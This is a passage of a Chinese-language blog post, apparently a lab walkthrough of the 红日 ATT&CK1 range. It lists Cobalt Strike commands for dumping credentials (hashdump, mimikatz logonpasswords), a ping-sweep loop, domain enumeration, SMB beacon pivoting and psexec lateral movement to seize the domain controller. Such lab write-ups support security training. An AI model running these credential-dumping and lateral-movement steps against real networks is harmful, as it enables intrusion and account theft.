class="line">获取域密码信息</span><br><span class="line"></span><br><span class="line">net view</span><br><span class="line">扫描端口信息</span><br><span class="line"></span><br><span class="line">hashdump</span><br><span class="line">读取内存密码</span><br><span class="line"></span><br><span class="line">logonpasswords</span><br><span class="line">用mimakatz读注册表密码</span><br><span class="line"></span><br><span class="line">shell for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.52.%I | findstr &quot;TTL=&quot;</span><br><span class="line">探测内网其他主机</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316193750450.png" alt="image-20230316193750450"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ipconfig</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316194121950.png" alt="image-20230316194121950"></p>
+<p>可以联想到这个就是他的内网IP</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316201055389.png" alt="image-20230316201055389"></p>
+<p>现在已经知道所在的域名为<code>god.org</code>  DC为<code>owa</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ping owa.god.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316213427468.png" alt="image-20230316213427468"></p>
+<p><strong>拿到域控的内网IP: 192.168.52.138</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell ping -a god.org</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316212840791.png" alt="image-20230316212840791"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell net user /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316213145933.png" alt="image-20230316213145933"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell wmic useraccount get /all</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316213237207.png" alt="image-20230316213237207"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316215422463.png" alt="image-20230316215422463"></p>
+<p>可以探测到域中的三台主机了</p>
+<blockquote>
+<p>192.168.52.138 (DC)</p>
+<p>192.168.52.141</p>
+<p>192.168.52,143 (已控制)</p>
+</blockquote>
+<p>因为内网的目标机器 192.168.52.138 和 192.168.52.141 无法直接连接到 kali 所以需要 cs 派生出一个 smb beacon, 让内网的主机连接到 win7 上面。</p>
+<p>下面介绍SMB Beacon：</p>
+<p>SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以<a target="_blank" rel="noopener" href="https://blog.cobaltstrike.com/2013/12/06/stealthy-peer-to-peer-cc-over-smb-pipes/">SMB Beacon</a>相对隐蔽。</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316222646863.png" alt="image-20230316222646863"></p>
+<p>第一种是在已经有的 beacon 上建立监听，用来作为跳板内网穿透，前提是通过 shell 访问其他内网主机，也就是获取 dc 的方法</p>
+<p>第二种是直接派生一个子 beacon, 目的是为了进一步盗取内网主机的 hash, 新建一个 listener,payload 设置为 beacon smb.</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316223943258.png" alt="image-20230316223943258"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316224253808.png" alt="image-20230316224253808"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316224335797.png" alt="image-20230316224335797"></p>
+<p>psexec 使用凭证来登录其他主机。已经探测到了获取内网的其他 targets 以及读取到的凭证信息，可以利用 psexec 模块登录到其他主机</p>
+<p>右键域控主机 (owa) 的 psexec 模块</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316230047345.png" alt="image-20230316230047345"></p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316230145825.png" alt="image-20230316230145825"></p>
+<p>拿到域控权限</p>
+<p><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/image-20230316230026176.png" alt="image-20230316230026176"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://css0k.github.io">css_0k</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://css0k.github.io/2023/03/16/ATT&amp;CK1/">https://css0k.github.io/2023/03/16/ATT&amp;CK1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a><a class="post-meta__tags" href="/tags/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA/">红日靶场</a></div><div class="post_share"><div class="social-share" data-image="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/gh/overtrue/share.js@master/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/03/10/XSS-CheatSheet/"><img class="next-cover" src="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">XSS-CheatSheet</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://s1.ax1x.com/2022/05/07/OlMpE4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">css_0k</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">38</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/css0k/css0k.github.io" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1327246897@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">内网环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Web服务器渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.1.1.</span> <span class="toc-text">端口探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.1.3.</span> <span class="toc-text">信息泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.</span> <span class="toc-text">测试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">2.2.1.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="toc-number">2.2.2.</span> <span class="toc-text">存储型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99"><span class="toc-number">2.2.3.</span> <span class="toc-text">任意文件读写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phpmyadmin%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="toc-number">2.2.4.</span> <span class="toc-text">phpmyadmin全局日志getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B0%9D%E8%AF%95select-into-outfile%E7%9B%B4%E6%8E%A5%E5%86%99%E5%85%A5"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">1.尝试select into outfile直接写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%BC%80%E5%90%AF%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">2.开启全局日志getshell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97getsehll"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">3.使用慢查询日志getsehll</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CobaltStrike%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">CobaltStrike搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">4.</span> <span class="toc-text">内网渗透</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/03/16/ATT&amp;CK1/" title="ATT&amp;CK1"><img src="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ATT&amp;CK1"/></a><div class="content"><a class="title" href="/2023/03/16/ATT&amp;CK1/" title="ATT&amp;CK1">ATT&amp;CK1</a><time datetime="2023-03-16T01:30:28.000Z" title="Created 2023-03-16 09:30:28">2023-03-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/XSS-CheatSheet/" title="XSS-CheatSheet"><img src="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XSS-CheatSheet"/></a><div class="content"><a class="title" href="/2023/03/10/XSS-CheatSheet/" title="XSS-CheatSheet">XSS-CheatSheet</a><time datetime="2023-03-10T00:54:12.000Z" title="Created 2023-03-10 08:54:12">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/10/Burpsuite-Client/" title="Burpsuite-Client"><img src="https://s1.ax1x.com/2022/05/08/O1qq6f.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burpsuite-Client"/></a><div class="content"><a class="title" href="/2023/03/10/Burpsuite-Client/" title="Burpsuite-Client">Burpsuite-Client</a><time datetime="2023-03-10T00:39:38.000Z" title="Created 2023-03-10 08:39:38">2023-03-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/02/18/Burpsuite-Server/" title="Burpsuite-Server"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/cf0178179a524ebdb423461adb3c3e8c.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Burpsuite-Server"/></a><div class="content"><a class="title" href="/2023/02/18/Burpsuite-Server/" title="Burpsuite-Server">Burpsuite-Server</a><time datetime="2023-02-18T14:33:44.000Z" title="Created 2023-02-18 22:33:44">2023-02-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/01/31/selenium%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" title="selenium自动化"><img src="https://css0k-1308151975.cos.ap-beijing.myqcloud.com/a93bec374a704e27ba9dd76c8c0961c3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="selenium自动化"/></a><div class="content"><a class="title" href="/2023/01/31/selenium%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/" title="selenium自动化">selenium自动化</a><time datetime="2023-01-31T05:02:14.000Z" title="Created 2023-01-31 13:02:14">2023-01-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://s1.ax1x.com/2022/05/08/O1qq6f.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By css_0k</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><div class="js-pjax"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
